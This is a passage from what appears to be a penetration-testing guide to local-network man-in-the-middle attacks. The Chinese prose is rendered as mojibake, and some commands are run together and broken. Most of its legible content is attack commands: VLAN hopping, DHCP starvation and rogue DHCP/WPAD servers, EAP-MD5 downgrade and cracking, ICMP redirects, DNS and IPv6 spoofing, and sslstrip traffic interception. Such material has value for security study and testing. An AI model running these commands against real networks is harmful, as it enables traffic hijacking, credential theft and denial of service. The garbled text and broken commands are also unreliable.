æˆ‘ä»¬ä½¿ç”¨æœ€åä¸€ç§æ–¹æ³•ï¼Œå› ä¸ºå®ƒæ˜¯æœ€å¿«çš„æ–¹æ³•ã€‚**`-i`**å‚æ•°æŒ‡å®šæ”»å‡»è€…çš„**ç½‘ç»œæ¥å£**ï¼Œ**`-E`**å‚æ•°æŒ‡å®šæ­£åœ¨æ¨¡æ‹Ÿçš„**VOIPè®¾å¤‡çš„åç§°**ã€‚æˆ‘ä»¬é€‰æ‹©äº†ä¸Cisco VoIPç”µè¯çš„å‘½åæ ¼å¼å…¼å®¹çš„åç§°SEP001EEEEEEEEEã€‚è¯¥æ ¼å¼ç”±â€œSEPâ€ä¸€è¯åè·ŸMACåœ°å€ç»„æˆã€‚åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œæ‚¨å¯ä»¥é€šè¿‡æŸ¥çœ‹ç”µè¯èƒŒé¢çš„MACæ ‡ç­¾ï¼›é€šè¿‡æŒ‰ä¸‹è®¾ç½®æŒ‰é’®å¹¶åœ¨ç”µè¯çš„æ˜¾ç¤ºå±ä¸Šé€‰æ‹©æ¨¡å‹ä¿¡æ¯é€‰é¡¹ï¼›æˆ–é€šè¿‡å°†VoIPè®¾å¤‡çš„ä»¥å¤ªç½‘ç”µç¼†è¿æ¥åˆ°æ‚¨çš„ç¬”è®°æœ¬ç”µè„‘å¹¶ä½¿ç”¨Wiresharkè§‚å¯Ÿè®¾å¤‡çš„CDPè¯·æ±‚æ¥æ¨¡æ‹Ÿç°æœ‰çš„VoIPè®¾å¤‡ã€‚
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
å¦‚æœå·¥å…·æˆåŠŸæ‰§è¡Œï¼Œ**VLANç½‘ç»œå°†ä¸ºæ”»å‡»è€…çš„è®¾å¤‡åˆ†é…ä¸€ä¸ªIPv4åœ°å€**ã€‚

### DHCPæ”»å‡»

#### æšä¸¾
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

å¯¹DHCPæœåŠ¡å™¨å¯ä»¥æ‰§è¡Œä¸¤ç§ç±»å‹çš„DoSæ”»å‡»ã€‚ç¬¬ä¸€ç§ç±»å‹æ˜¯æ¨¡æ‹Ÿè¶³å¤Ÿå¤šçš„è™šå‡ä¸»æœºä»¥ä½¿ç”¨æ‰€æœ‰å¯èƒ½çš„IPåœ°å€ã€‚\
åªæœ‰åœ¨æ‚¨èƒ½å¤Ÿçœ‹åˆ°DHCPæœåŠ¡å™¨çš„å“åº”å¹¶å®Œæˆåè®®ï¼ˆDiscoverï¼ˆè®¡ç®—æœºï¼‰-> Offerï¼ˆæœåŠ¡å™¨ï¼‰-> Requestï¼ˆè®¡ç®—æœºï¼‰-> ACKï¼ˆæœåŠ¡å™¨ï¼‰ï¼‰æ—¶ï¼Œæ­¤æ”»å‡»æ‰èƒ½ç”Ÿæ•ˆã€‚ä¾‹å¦‚ï¼Œåœ¨Wifiç½‘ç»œä¸­æ˜¯ä¸å¯èƒ½çš„ã€‚

æ‰§è¡ŒDHCP DoSçš„å¦ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨æ¯ä¸ªå¯èƒ½çš„IPåœ°å€ä½œä¸ºæºä»£ç å‘é€DHCP-RELEASEæ•°æ®åŒ…ã€‚ç„¶åï¼ŒæœåŠ¡å™¨å°†è®¤ä¸ºæ¯ä¸ªäººéƒ½å·²ç»å®Œæˆäº†å¯¹IPçš„ä½¿ç”¨ã€‚
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
ä¸€ç§æ›´è‡ªåŠ¨åŒ–çš„æ–¹æ³•æ˜¯ä½¿ç”¨å·¥å…·[DHCPing](https://github.com/kamorin/DHCPig)

æ‚¨å¯ä»¥ä½¿ç”¨ä¸Šè¿°çš„DoSæ”»å‡»æ¥è¿«ä½¿å®¢æˆ·ç«¯åœ¨ç¯å¢ƒä¸­è·å–æ–°çš„ç§Ÿçº¦ï¼Œå¹¶è€—å°½åˆæ³•æœåŠ¡å™¨ä½¿å…¶æ— æ³•å“åº”ã€‚å› æ­¤ï¼Œå½“åˆæ³•æœåŠ¡å™¨å°è¯•é‡æ–°è¿æ¥æ—¶ï¼Œ**æ‚¨å¯ä»¥æä¾›ä¸‹ä¸€ä¸ªæ”»å‡»ä¸­æåˆ°çš„æ¶æ„å€¼**ã€‚

#### è®¾ç½®æ¶æ„å€¼

æ‚¨å¯ä»¥ä½¿ç”¨Responder DHCPè„šæœ¬ï¼ˆ_/usr/share/responder/DHCP.py_ï¼‰æ¥å»ºç«‹ä¸€ä¸ªæ¶æ„çš„DHCPæœåŠ¡å™¨ã€‚è®¾ç½®æ¶æ„ç½‘å…³å¹¶ä¸ç†æƒ³ï¼Œå› ä¸ºåŠ«æŒçš„è¿æ¥åªæ˜¯åŠåŒå·¥çš„ï¼ˆå³ï¼Œæˆ‘ä»¬åªæ•è·å®¢æˆ·ç«¯çš„å‡ºç«™æ•°æ®åŒ…ï¼Œè€Œæ— æ³•æ•è·åˆæ³•ç½‘å…³çš„å“åº”ï¼‰ã€‚å› æ­¤ï¼Œæˆ‘å»ºè®®è®¾ç½®ä¸€ä¸ªæ¶æ„çš„DNSæˆ–WPADæœåŠ¡å™¨æ¥æ•è·HTTPæµé‡å’Œå‡­æ®ã€‚

| æè¿°                                 | ç¤ºä¾‹                                                                      |
| ------------------------------------------- | ---------------------------------------------------------------------------- |
| æˆ‘ä»¬ä½œä¸ºç½‘å…³å¹¿å‘Šçš„IPåœ°å€     | _-i 10.0.0.100_                                                              |
| æœ¬åœ°DNSåŸŸåï¼ˆå¯é€‰ï¼‰        | _-d example.org_                                                             |
| åŸå§‹è·¯ç”±å™¨/ç½‘å…³çš„IPåœ°å€   | _-r 10.0.0.1_                                                                |
| ä¸»DNSæœåŠ¡å™¨IPåœ°å€               | _-p 10.0.0.100_                                                              |
| å¤‡ç”¨DNSæœåŠ¡å™¨IPåœ°å€ï¼ˆå¯é€‰ï¼‰  | _-s 10.0.0.1_                                                                |
| æœ¬åœ°ç½‘ç»œçš„å­ç½‘æ©ç             | _-n 255.255.255.0_                                                           |
| ç”¨äºç›‘å¬DHCPæµé‡çš„æ¥å£ | _-I eth1_                                                                    |
| WPADé…ç½®åœ°å€ï¼ˆURLï¼‰            | _-w â€œ_[http://10.0.0.100/wpad.dat\nâ€](http://10.0.0.100/wpad.dat/n%E2%80%9D) |
| ä¼ªé€ é»˜è®¤ç½‘å…³IPåœ°å€        | -S                                                                           |
| å“åº”æ‰€æœ‰DHCPè¯·æ±‚ï¼ˆéå¸¸å˜ˆæ‚ï¼‰   | -R                                                                           |

### **EAPæ”»å‡»**

ä»¥ä¸‹æ˜¯é’ˆå¯¹802.1Xå®ç°å¯ç”¨çš„ä¸€äº›æ”»å‡»ç­–ç•¥ï¼š

* é€šè¿‡EAPè¿›è¡Œä¸»åŠ¨æš´åŠ›å¯†ç ç ´è§£
* ä½¿ç”¨æ¶æ„çš„EAPå†…å®¹æ”»å‡»RADIUSæœåŠ¡å™¨ _\*\*_(åˆ©ç”¨æ¼æ´)
* æ•è·EAPæ¶ˆæ¯å¹¶ç¦»çº¿ç ´è§£å¯†ç ï¼ˆEAP-MD5å’ŒPEAPï¼‰
* å¼ºåˆ¶ä½¿ç”¨EAP-MD5èº«ä»½éªŒè¯ç»•è¿‡TLSè¯ä¹¦éªŒè¯
* åœ¨ä½¿ç”¨é›†çº¿å™¨æˆ–ç±»ä¼¼è®¾å¤‡è¿›è¡Œèº«ä»½éªŒè¯åæ³¨å…¥æ¶æ„ç½‘ç»œæµé‡

å¦‚æœæ”»å‡»è€…ä½äºå—å®³è€…å’Œè®¤è¯æœåŠ¡å™¨ä¹‹é—´ï¼Œä»–å¯ä»¥å°è¯•å°†è®¤è¯åè®®é™çº§ï¼ˆå¦‚æœéœ€è¦ï¼‰ä¸ºEAP-MD5å¹¶æ•è·è®¤è¯å°è¯•ã€‚ç„¶åï¼Œä»–å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œæš´åŠ›ç ´è§£ï¼š
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRPï¼ˆGLBPå’ŒHSRPï¼‰æ”»å‡» <a href="#6196" id="6196"></a>

**FHRP**ï¼ˆFirst Hop Redundancy Protocolï¼‰æ˜¯ä¸€ç±»ç”¨äºåˆ›å»ºçƒ­å¤‡ä»½è·¯ç”±ç³»ç»Ÿçš„ç½‘ç»œåè®®ã€‚é€šè¿‡FHRPï¼Œç‰©ç†è·¯ç”±å™¨å¯ä»¥ç»„åˆæˆä¸€ä¸ªå•ä¸€çš„é€»è¾‘è®¾å¤‡ï¼Œä»è€Œå¢åŠ å®¹é”™æ€§å¹¶å¸®åŠ©åˆ†æ‹…è´Ÿè½½ã€‚

**æ€ç§‘ç³»ç»Ÿçš„å·¥ç¨‹å¸ˆå¼€å‘äº†ä¸¤ç§FHRPåè®®ï¼Œå³GLBPå’ŒHSRPã€‚**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

è·¯ç”±ä¿¡æ¯åè®®ï¼ˆRIPï¼‰æœ‰ä¸‰ä¸ªç‰ˆæœ¬â€”â€”RIPã€RIPv2å’ŒRIPngã€‚RIPå’ŒRIPv2ä½¿ç”¨é€šè¿‡ç«¯å£520å‘é€åˆ°å¯¹ç­‰æ–¹çš„UDPæ•°æ®æŠ¥ï¼Œè€ŒRIPngé€šè¿‡IPv6ç»„æ’­å°†æ•°æ®æŠ¥å¹¿æ’­åˆ°UDPç«¯å£521ã€‚RIPv2å¼•å…¥äº†MD5èº«ä»½éªŒè¯æ”¯æŒã€‚RIPngä¸åŒ…å«æœ¬åœ°èº«ä»½éªŒè¯ï¼Œè€Œæ˜¯ä¾èµ–äºIPv6ä¸­çš„å¯é€‰IPsec AHå’ŒESPå¤´ã€‚

æœ‰å…³å¦‚ä½•æ”»å‡»æ­¤åè®®çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ä¹¦ç±_**Network Security Assessment: Know Your Network (ç¬¬3ç‰ˆ)**_ã€‚

### EIGRPæ”»å‡»

**EIGRPï¼ˆEnhanced Interior Gateway Routing Protocolï¼‰**æ˜¯ä¸€ç§åŠ¨æ€è·¯ç”±åè®®ã€‚**å®ƒæ˜¯ä¸€ç§è·ç¦»çŸ¢é‡åè®®ã€‚**å¦‚æœæ²¡æœ‰èº«ä»½éªŒè¯å’Œè¢«åŠ¨æ¥å£çš„é…ç½®ï¼Œ**å…¥ä¾µè€…**å¯ä»¥å¹²æ‰°EIGRPè·¯ç”±å¹¶å¯¼è‡´**è·¯ç”±è¡¨æ±¡æŸ“**ã€‚æ­¤å¤–ï¼ŒEIGRPç½‘ç»œï¼ˆæ¢å¥è¯è¯´ï¼Œè‡ªæ²»ç³»ç»Ÿï¼‰**æ˜¯å¹³å¦çš„ï¼Œæ²¡æœ‰åˆ†æ®µæˆä»»ä½•åŒºåŸŸ**ã€‚å¦‚æœ**æ”»å‡»è€…æ³¨å…¥ä¸€æ¡è·¯ç”±**ï¼Œå¾ˆå¯èƒ½è¿™æ¡è·¯ç”±ä¼šåœ¨è‡ªæ²»EIGRPç³»ç»Ÿä¸­**ä¼ æ’­**ã€‚

æ”»å‡»EIGRPç³»ç»Ÿéœ€è¦**ä¸åˆæ³•çš„EIGRPè·¯ç”±å™¨å»ºç«‹é‚»å±…å…³ç³»**ï¼Œè¿™æ‰“å¼€äº†è®¸å¤šå¯èƒ½æ€§ï¼Œä»åŸºæœ¬çš„ä¾¦å¯Ÿåˆ°å„ç§æ³¨å…¥ã€‚

\*\*\*\*[**FRRouting**](https://frrouting.org/)å…è®¸æ‚¨å®ç°**æ”¯æŒBGPã€OSPFã€EIGRPã€RIPå’Œå…¶ä»–åè®®çš„è™šæ‹Ÿè·¯ç”±å™¨**ã€‚æ‚¨åªéœ€åœ¨æ”»å‡»è€…çš„ç³»ç»Ÿä¸Šéƒ¨ç½²å®ƒï¼Œå°±å¯ä»¥å‡è£…æˆè·¯ç”±åŸŸä¸­çš„åˆæ³•è·¯ç”±å™¨ã€‚

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

\*\*\*\*[**Coly**](https://code.google.com/p/coly/)è¿˜æ”¯æŒæ•è·EIGRPå¹¿æ’­å’Œæ³¨å…¥æ•°æ®åŒ…ä»¥æ“çºµè·¯ç”±é…ç½®ã€‚æœ‰å…³å¦‚ä½•ä½¿ç”¨Colyæ”»å‡»å®ƒçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…_**Network Security Assessment: Know Your Network (ç¬¬3ç‰ˆ)**_ã€‚

### OSPF

å¤§å¤šæ•°Open Shortest Path Firstï¼ˆOSPFï¼‰å®ç°ä½¿ç”¨MD5æä¾›è·¯ç”±å™¨ä¹‹é—´çš„èº«ä»½éªŒè¯ã€‚Lokiå’ŒJohn the Ripperå¯ä»¥æ•è·å’Œæ”»å‡»MD5å“ˆå¸Œä»¥æ­ç¤ºå¯†é’¥ï¼Œç„¶åå¯ä»¥ä½¿ç”¨è¯¥å¯†é’¥æ¥å¹¿å‘Šæ–°è·¯ç”±ã€‚å¯ä»¥ä½¿ç”¨â€œæ³¨å…¥â€é€‰é¡¹å¡è®¾ç½®è·¯ç”±å‚æ•°ï¼Œå¹¶åœ¨â€œè¿æ¥â€ä¸‹è®¾ç½®å¯†é’¥ã€‚

æœ‰å…³å¦‚ä½•æ”»å‡»æ­¤åè®®çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…ä¹¦ç±_**Network Security Assessment: Know Your Network (ç¬¬3ç‰ˆ)**_ã€‚

### å…¶ä»–é€šç”¨å·¥å…·å’Œèµ„æº

* [**Above**](https://github.com/c4s73r/Above)ï¼šç”¨äºæ‰«æç½‘ç»œæµé‡å¹¶æŸ¥æ‰¾æ¼æ´çš„å·¥å…·
* æ‚¨å¯ä»¥åœ¨[æ­¤å¤„](https://github.com/Sab0tag3d/MITM-cheatsheet)æ‰¾åˆ°æœ‰å…³ç½‘ç»œæ”»å‡»çš„æ›´å¤šä¿¡æ¯ã€‚_ï¼ˆTODOï¼šé˜…è¯»æ‰€æœ‰å†…å®¹å’Œä»»ä½•æ–°æ”»å‡»ï¼‰_

## **æ¬ºéª—**

æ”»å‡»è€…é€šè¿‡å‘é€è™šå‡çš„DHCPå“åº”æ¥é…ç½®æ–°åŠ å…¥ç½‘ç»œçš„æ‰€æœ‰ç½‘ç»œå‚æ•°ï¼ˆGWã€IPã€DNSï¼‰ã€‚
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARPæ¬ºéª—

è¯·æŸ¥çœ‹[å‰ä¸€èŠ‚](./#arp-spoofing)ã€‚

### ICMPé‡å®šå‘

ICMPé‡å®šå‘æ˜¯æŒ‡å‘é€ä¸€ä¸ªICMPæ•°æ®åŒ…ï¼Œç±»å‹ä¸º1ï¼Œä»£ç ä¸º5ï¼Œè¡¨ç¤ºæ”»å‡»è€…æ˜¯åˆ°è¾¾æŸä¸ªIPåœ°å€çš„æœ€ä½³è·¯å¾„ã€‚ç„¶åï¼Œå½“å—å®³è€…æƒ³è¦è”ç³»è¯¥IPåœ°å€æ—¶ï¼Œå®ƒä¼šé€šè¿‡æ”»å‡»è€…å‘é€æ•°æ®åŒ…ã€‚
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNSæ¬ºéª—

æ”»å‡»è€…å°†è§£æå—å®³è€…è¯·æ±‚çš„ä¸€äº›ï¼ˆæˆ–å…¨éƒ¨ï¼‰åŸŸåã€‚
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**ä½¿ç”¨dnsmasqé…ç½®è‡ªå·±çš„DNS**

Dnsmasqæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥ç”¨äºé…ç½®è‡ªå·±çš„DNSæœåŠ¡å™¨ã€‚é€šè¿‡ä½¿ç”¨Dnsmasqï¼Œæ‚¨å¯ä»¥å°†ç‰¹å®šçš„åŸŸåè§£æåˆ°æ‚¨é€‰æ‹©çš„IPåœ°å€ï¼Œä»è€Œå®ç°æ›´çµæ´»çš„ç½‘ç»œé…ç½®ã€‚

ä»¥ä¸‹æ˜¯ä½¿ç”¨Dnsmasqé…ç½®è‡ªå·±çš„DNSçš„æ­¥éª¤ï¼š

1. **å®‰è£…Dnsmasq**ï¼šé¦–å…ˆï¼Œæ‚¨éœ€è¦å®‰è£…Dnsmasqè½¯ä»¶åŒ…ã€‚æ‚¨å¯ä»¥ä½¿ç”¨é€‚ç”¨äºæ‚¨çš„æ“ä½œç³»ç»Ÿçš„åŒ…ç®¡ç†å™¨æ¥å®‰è£…å®ƒã€‚

2. **ç¼–è¾‘é…ç½®æ–‡ä»¶**ï¼šæ‰¾åˆ°Dnsmasqçš„é…ç½®æ–‡ä»¶ï¼Œé€šå¸¸ä½äº`/etc/dnsmasq.conf`ã€‚ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€è¯¥æ–‡ä»¶ã€‚

3. **é…ç½®DNSè§£æ**ï¼šåœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­æ³•å°†ç‰¹å®šçš„åŸŸåè§£æåˆ°æ‚¨é€‰æ‹©çš„IPåœ°å€ï¼š

   ```
   address=/example.com/192.168.1.100
   ```

   åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œå°†`example.com`è§£æä¸º`192.168.1.100`ã€‚æ‚¨å¯ä»¥æ ¹æ®éœ€è¦æ·»åŠ å¤šä¸ªè§£æè§„åˆ™ã€‚

4. **ä¿å­˜å¹¶å…³é—­æ–‡ä»¶**ï¼šåœ¨å®Œæˆé…ç½®åï¼Œä¿å­˜å¹¶å…³é—­é…ç½®æ–‡ä»¶ã€‚

5. **é‡å¯DnsmasqæœåŠ¡**ï¼šä½¿ç”¨é€‚ç”¨äºæ‚¨çš„æ“ä½œç³»ç»Ÿçš„å‘½ä»¤ï¼Œé‡å¯DnsmasqæœåŠ¡ä»¥ä½¿æ›´æ”¹ç”Ÿæ•ˆã€‚

ç°åœ¨ï¼Œæ‚¨å·²æˆåŠŸé…ç½®äº†è‡ªå·±çš„DNSæœåŠ¡å™¨ã€‚å½“æ‚¨çš„ç³»ç»Ÿå°è¯•è§£æé…ç½®çš„åŸŸåæ—¶ï¼Œå®ƒå°†ä½¿ç”¨æ‚¨æŒ‡å®šçš„IPåœ°å€è¿›è¡Œè§£æã€‚è¿™ä½¿æ‚¨èƒ½å¤Ÿæ›´å¥½åœ°æ§åˆ¶ç½‘ç»œæµé‡å’Œè®¿é—®ã€‚
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### æœ¬åœ°ç½‘å…³

é€šå¸¸å­˜åœ¨å¤šä¸ªç³»ç»Ÿå’Œç½‘ç»œçš„è·¯ç”±ã€‚åœ¨æ„å»ºæœ¬åœ°ç½‘ç»œä¸­çš„MACåœ°å€åˆ—è¡¨åï¼Œä½¿ç”¨ _gateway-finder.py_ æ¥è¯†åˆ«æ”¯æŒIPv4è½¬å‘çš„ä¸»æœºã€‚
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [æ¬ºéª—LLMNRã€NBT-NSå’ŒmDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoftç³»ç»Ÿåœ¨DNSæŸ¥æ‰¾å¤±è´¥æ—¶ï¼Œä½¿ç”¨é“¾è·¯æœ¬åœ°ç»„æ’­åç§°è§£æï¼ˆLLMNRï¼‰å’ŒNetBIOSåç§°æœåŠ¡ï¼ˆNBT-NSï¼‰è¿›è¡Œæœ¬åœ°ä¸»æœºè§£æã€‚Apple Bonjourå’ŒLinuxé›¶é…ç½®å®ç°ä½¿ç”¨å¤šæ’­DNSï¼ˆmDNSï¼‰æ¥å‘ç°ç½‘ç»œä¸­çš„ç³»ç»Ÿã€‚è¿™äº›åè®®æ˜¯æœªç»èº«ä»½éªŒè¯çš„ï¼Œå¹¶é€šè¿‡UDPå¹¿æ’­æ¶ˆæ¯ï¼›å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒä»¬å°†ç”¨æˆ·å¼•å¯¼åˆ°æ¶æ„æœåŠ¡ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨Responderæ¥å‘é€è™šå‡å“åº”ï¼Œå†’å……ä¸»æœºæœç´¢çš„æœåŠ¡ã€‚\
åœ¨æ­¤å¤„é˜…è¯»æœ‰å…³[å¦‚ä½•ä½¿ç”¨Responderå†’å……æœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)çš„æ›´å¤šä¿¡æ¯ã€‚

### [æ¬ºéª—WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

è®¸å¤šæµè§ˆå™¨ä½¿ç”¨Webä»£ç†è‡ªåŠ¨å‘ç°ï¼ˆWPADï¼‰ä»ç½‘ç»œåŠ è½½ä»£ç†è®¾ç½®ã€‚WPADæœåŠ¡å™¨é€šè¿‡ç‰¹å®šçš„URLï¼ˆä¾‹å¦‚ï¼Œ[http://wpad.example.org/wpad.dat](http://wpad.example.org/wpad.dat)ï¼‰æä¾›å®¢æˆ·ç«¯ä»£ç†è®¾ç½®ï¼Œå½“é€šè¿‡ä»¥ä¸‹ä»»ä¸€æ–¹å¼è¯†åˆ«æ—¶ï¼š

* DHCPï¼Œä½¿ç”¨ä»£ç 252æ¡ç›®[34](https://learning.oreilly.com/library/view/Network+Security+Assessment,+3rd+Edition/9781491911044/ch05.html#ch05fn41)
* DNSï¼Œåœ¨æœ¬åœ°åŸŸä¸­æœç´¢_wpad_ä¸»æœºå
* Microsoft LLMNRå’ŒNBT-NSï¼ˆåœ¨DNSæŸ¥æ‰¾å¤±è´¥çš„æƒ…å†µä¸‹ï¼‰

Responderè‡ªåŠ¨åŒ–äº†WPADæ”»å‡»-è¿è¡Œä»£ç†å¹¶é€šè¿‡DHCPã€DNSã€LLMNRå’ŒNBT-NSå°†å®¢æˆ·ç«¯å¼•å¯¼åˆ°æ¶æ„WPADæœåŠ¡å™¨ã€‚\
åœ¨æ­¤å¤„é˜…è¯»æœ‰å…³[å¦‚ä½•ä½¿ç”¨Responderå†’å……æœåŠ¡](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)çš„æ›´å¤šä¿¡æ¯ã€‚

### [æ¬ºéª—SSDPå’ŒUPnPè®¾å¤‡](spoofing-ssdp-and-upnp-devices.md)

æ‚¨å¯ä»¥åœ¨ç½‘ç»œä¸­æä¾›ä¸åŒçš„æœåŠ¡ï¼Œè¯•å›¾æ¬ºéª—ç”¨æˆ·è¾“å…¥ä¸€äº›æ˜æ–‡å‡­æ®ã€‚**æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…**[**æ¬ºéª—SSDPå’ŒUPnPè®¾å¤‡**](spoofing-ssdp-and-upnp-devices.md)**ã€‚**

### IPv6é‚»å±…æ¬ºéª—

è¿™ç§æ”»å‡»ä¸ARPæ¬ºéª—éå¸¸ç›¸ä¼¼ï¼Œä½†é€‚ç”¨äºIPv6ç¯å¢ƒã€‚æ‚¨å¯ä»¥è®©å—å®³è€…è®¤ä¸ºç½‘å…³çš„IPv6å…·æœ‰æ”»å‡»è€…çš„MACåœ°å€ã€‚
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6è·¯ç”±å™¨å¹¿å‘Šæ¬ºéª—/æ´ªæ°´æ”»å‡»

ä¸€äº›æ“ä½œç³»ç»Ÿé»˜è®¤é€šè¿‡ç½‘ç»œä¸­å‘é€çš„RAæ•°æ®åŒ…é…ç½®ç½‘å…³ã€‚è¦å°†æ”»å‡»è€…å£°æ˜ä¸ºIPv6è·¯ç”±å™¨ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCPæ¬ºéª—

é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€äº›æ“ä½œç³»ç»Ÿä¼šå°è¯•é€šè¿‡è¯»å–ç½‘ç»œä¸­çš„DHCPv6æ•°æ®åŒ…æ¥é…ç½®DNSã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥å‘é€ä¸€ä¸ªDHCPv6æ•°æ®åŒ…æ¥å°†è‡ªå·±é…ç½®ä¸ºDNSæœåŠ¡å™¨ã€‚DHCPè¿˜ä¼šä¸ºå—å®³è€…æä¾›ä¸€ä¸ªIPv6åœ°å€ã€‚
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTPï¼ˆä¼ªé€ é¡µé¢å’ŒJSä»£ç æ³¨å…¥ï¼‰

## äº’è”ç½‘æ”»å‡»

### sslStrip

åŸºæœ¬ä¸Šï¼Œè¿™ç§æ”»å‡»çš„ä½œç”¨æ˜¯ï¼Œå½“**ç”¨æˆ·**è¯•å›¾**è®¿é—®**ä¸€ä¸ª**é‡å®šå‘**åˆ°**HTTPS**ç‰ˆæœ¬çš„**HTTP**é¡µé¢æ—¶ï¼Œ**sslStrip**å°†ä¸**å®¢æˆ·ç«¯**å»ºç«‹**HTTPè¿æ¥**å¹¶ä¸**æœåŠ¡å™¨**å»ºç«‹**HTTPSè¿æ¥**ï¼Œä»è€Œèƒ½å¤Ÿä»¥**æ˜æ–‡**æ–¹å¼**å—…æ¢**è¿æ¥ã€‚
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
æ›´å¤šä¿¡æ¯[åœ¨è¿™é‡Œ](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)ã€‚

### ç”¨äºç»•è¿‡HSTSçš„sslStrip+å’Œdns2proxy

**sslStrip+å’Œdns2proxy**ä¸**sslStrip**çš„**åŒºåˆ«**åœ¨äºå®ƒä»¬ä¼šå°†ä¾‹å¦‚_**www.facebook.com**_ **é‡å®šå‘åˆ°**_**wwww.facebook.com**_ï¼ˆæ³¨æ„**é¢å¤–çš„**â€œ**w**â€ï¼‰ï¼Œå¹¶å°†**æ­¤åŸŸçš„åœ°å€è®¾ç½®ä¸ºæ”»å‡»è€…çš„IP**ã€‚è¿™æ ·ï¼Œ**å®¢æˆ·ç«¯**å°†**è¿æ¥åˆ°**_**wwww.facebook.com**_ï¼ˆæ”»å‡»è€…ï¼‰ï¼Œä½†åœ¨å¹•åï¼Œ**sslstrip+**å°†é€šè¿‡httpsä¸**www.facebook.com**ä¿æŒ**çœŸå®è¿æ¥**ã€‚

